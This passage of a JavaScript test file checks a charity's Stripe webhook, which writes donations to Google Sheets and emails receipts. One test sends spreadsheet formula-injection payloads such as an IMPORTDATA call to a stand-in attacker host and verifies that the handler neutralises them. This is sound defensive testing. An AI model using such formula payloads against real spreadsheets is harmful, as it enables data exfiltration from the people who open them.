              campaign,
              donor_note: "=not a cell-leading formula",
            },
          },
        },
      });
      const signature = createHmac("sha256", secret).update(`${timestamp}.${body}`).digest("hex");
      const response = await webhook.onRequestPost({
        request: new Request("https://one-world-relief.org/charity/webhooks/stripe", {
          method: "POST",
          headers: { "stripe-signature": `t=${timestamp},v1=${signature}` },
          body,
        }),
        env: {
          OWR_STRIPE_WEBHOOK_SECRET: secret,
          OWR_GOOGLE_SHEET_ID: "sheet_123",
          OWR_GOOGLE_SERVICE_ACCOUNT_EMAIL: "service@example.iam.gserviceaccount.com",
          OWR_GOOGLE_PRIVATE_KEY: privateKey,
        },
      });
      assert.equal(response.status, 200);
    };

    await deliver({
      sessionId: "cs_formula_1",
      donationId: "=IMPORTDATA(\"https://attacker.example\")",
      donorName: "  +SUM(1,1)",
      campaign: "-1+1",
    });
    await deliver({
      sessionId: "cs_formula_2",
      donationId: "safe_donation_id",
      donorName: "@HYPERLINK(\"https://attacker.example\")",
      campaign: "General Fund",
    });

    const appendCalls = calls.filter((call) => call.url.includes("sheets.googleapis.com") && call.url.includes(":append"));
    assert.equal(appendCalls.length, 2);
    const firstRow = JSON.parse(appendCalls[0].options.body).values[0];
    const secondRow = JSON.parse(appendCalls[1].options.body).values[0];
    assert.equal(firstRow[0], "'=IMPORTDATA(\"https://attacker.example\")");
    assert.equal(firstRow[2], "'  +SUM(1,1)");
    assert.equal(firstRow[4], "'-1+1");
    assert.equal(secondRow[2], "'@HYPERLINK(\"https://attacker.example\")");
    assert.equal(firstRow[1], "2/2/2026");
    assert.equal(firstRow[3], 25);
    assert.equal(firstRow[5], "Stripe");
    assert.match(firstRow[7], /Donor Note: =not a cell-leading formula/);
    for (const row of [firstRow, secondRow]) {
      assert.equal(row.some((cell) => typeof cell === "string" && /^[=+\-@]/.test(cell.trim())), false);
    }
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("stripe webhook records recurring invoice payments with subscription metadata", async () => {
  const webhook = await importFunctionModule("functions/charity/webhooks/stripe.js");
  const originalFetch = globalThis.fetch;
  const secret = "whsec_test";
  const timestamp = "1770000000";
  const calls = [];
  const body = JSON.stringify({
    id: "evt_invoice_paid",
    type: "invoice.paid",
    data: {
      object: {
        id: "in_recurring_123",
        created: 1770600000,
        amount_paid: 2500,
        total: 2500,
        status: "paid",
        customer_email: "monthly@example.com",
        customer_name: "Monthly Donor",
        subscription: "sub_123",
        payment_intent: "pi_invoice_123",
        parent: {
          subscription_details: {
            metadata: {
              donation_id: "don_sub_123",
              donor_name: "Monthly Donor",
              donor_email: "monthly@example.com",
              campaign: "Orphan Support",
              donor_note: "Monthly orphan care",
              anonymous_public: "no",
              giving_frequency: "monthly",
              recurring_interval: "month",
              schedule_label: "Monthly donation",
            },
          },
        },
      },
    },
  });
  const signature = createHmac("sha256", secret).update(`${timestamp}.${body}`).digest("hex");

  globalThis.fetch = async (url, options) => {
    calls.push({ url: String(url), options });
    if (String(url).includes("oauth2.googleapis.com")) {
      return new Response(JSON.stringify({ access_token: "google-token" }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }
    if (String(url).includes("api.resend.com")) {
      return new Response(JSON.stringify({ id: "email_recurring_123" }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }
    if (String(url).includes("sheets.googleapis.com") && !String(url).includes(":append")) {
      return new Response(JSON.stringify({ values: [["Donation ID", "Date", "Donor Name", "Amount ($)", "Purpose/Fund", "Method", "Receipt ID", "Notes"]] }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }
    if (String(url).includes("sheets.googleapis.com") && String(url).includes(":append")) {
      return new Response(JSON.stringify({ updates: { updatedRows: 1 } }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }
    throw new Error(`Unexpected fetch ${url}`);
  };

  try {
    const privateKey = await createGooglePrivateKey();
    const response = await webhook.onRequestPost({
      request: new Request("https://one-world-relief.org/charity/webhooks/stripe", {
        method: "POST",
        headers: { "stripe-signature": `t=${timestamp},v1=${signature}` },
        body,
      }),
      env: {
        OWR_STRIPE_WEBHOOK_SECRET: secret,
        OWR_GOOGLE_SHEET_ID: "sheet_123",
        OWR_GOOGLE_SHEET_TAB: "Donations (2026)",
        OWR_GOOGLE_SERVICE_ACCOUNT_EMAIL: "service@example.iam.gserviceaccount.com",
        OWR_GOOGLE_PRIVATE_KEY: privateKey,
        OWR_PUBLIC_SITE_URL: "https://one-world-relief.org",
        OWR_RESEND_API_KEY: "re_test",
        OWR_RECEIPT_FROM_EMAIL: "OneWorld Relief <receipts@one-world-relief.org>",
      },
    });

    assert.equal(response.status, 200);
    const sheetCall = calls.find((call) => call.url.includes("sheets.googleapis.com") && call.url.includes(":append"));
    assert.ok(sheetCall, "recurring paid invoice should append a donation row");
    const sheetPayload = JSON.parse(sheetCall.options.body);
    assert.equal(sheetPayload.values[0][0], "don_sub_123-in_recurring_123");
    assert.equal(sheetPayload.values[0][2], "Monthly Donor");
    assert.equal(sheetPayload.values[0][3], 25);
    assert.equal(sheetPayload.values[0][4], "Orphan Support");
    assert.match(sheetPayload.values[0][6], /^R-2026-/);
    assert.match(sheetPayload.values[0][7], /Subscription: sub_123/);
    assert.match(sheetPayload.values[0][7], /Stripe Invoice: in_recurring_123/);
    assert.match(sheetPayload.values[0][7], /Giving Schedule: Monthly donation/);
    assert.match(sheetPayload.values[0][7], /Receipt Email: sent/);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("stripe webhook skips existing spreadsheet rows without duplicate receipt email", async () => {
  const webhook = await importFunctionModule("functions/charity/webhooks/stripe.js");
  const originalFetch = globalThis.fetch;
  const secret = "whsec_test";
  const timestamp = "1770000000";
  const calls = [];
  const body = JSON.stringify({
    id: "evt_test_duplicate",
    type: "checkout.session.completed",
    data: {
      object: {
        id: "cs_test_duplicate",
        created: 1770000000,
        amount_total: 100,
        payment_status: "paid",
        customer_email: "donor@example.com",
        client_reference_id: "don_duplicate",
        payment_intent: "pi_test_duplicate",
        metadata: {
          donation_id: "don_duplicate",
          donor_name: "Test Donor",
          donor_email: "donor@example.com",
          campaign: "General Fund",
        },
      },
    },
  });
  const signature = createHmac("sha256", secret).update(`${timestamp}.${body}`).digest("hex");

  globalThis.fetch = async (url, options) => {
    calls.push({ url: String(url), options });
    if (String(url).includes("oauth2.googleapis.com")) {
      return new Response(JSON.stringify({ access_token: "google-token" }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }
    if (String(url).includes("sheets.googleapis.com") && !String(url).includes(":append")) {
      return new Response(JSON.stringify({
        values: [
          ["Donation ID", "Date", "Donor Name", "Amount ($)", "Purpose/Fund", "Method", "Receipt ID", "Notes"],
          ["don_duplicate", "2/2/2026", "Test Donor", "$1.00", "General Fund", "Stripe", "R-2026-02-02-DONDUPLIC", "Stripe Session: cs_test_duplicate"],
        ],
      }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });
    }
    throw new Error(`Unexpected fetch ${url}`);
  };

  try {
    const privateKey = await createGooglePrivateKey();

    const response = await webhook.onRequestPost({
      request: new Request("https://one-world-relief.org/charity/webhooks/stripe", {
        method: "POST",
        headers: { "stripe-signature": `t=${timestamp},v1=${signature}` },
        body,
      }),
      env: {
        OWR_STRIPE_WEBHOOK_SECRET: secret,
        OWR_GOOGLE_SHEET_ID: "sheet_123",
        OWR_GOOGLE_SHEET_TAB: "Donations (2026)",
        OWR_GOOGLE_SERVICE_ACCOUNT_EMAIL: "service@example.iam.gserviceaccount.com",
        OWR_GOOGLE_PRIVATE_KEY: privateKey,
        OWR_PUBLIC_SITE_URL: "https://one-world-relief.org",
        OWR_RESEND_API_KEY: "re_test",
        OWR_RECEIPT_FROM_EMAIL: "OneWorld Relief <receipts@one-world-relief.org>",
      },
    });

    assert.equal(response.status, 200);
    assert.ok(calls.some((call) => call.url.includes("sheets.googleapis.com") && !call.url.includes(":append")));
    assert.equal(calls.some((call) => call.url.includes("api.resend.com")), false);
    assert.equal(calls.some((call) => call.url.includes("sheets.googleapis.com") && call.url.includes(":append")), false);
  } finally {
    globalThis.fetch = originalFetch;
  }
});
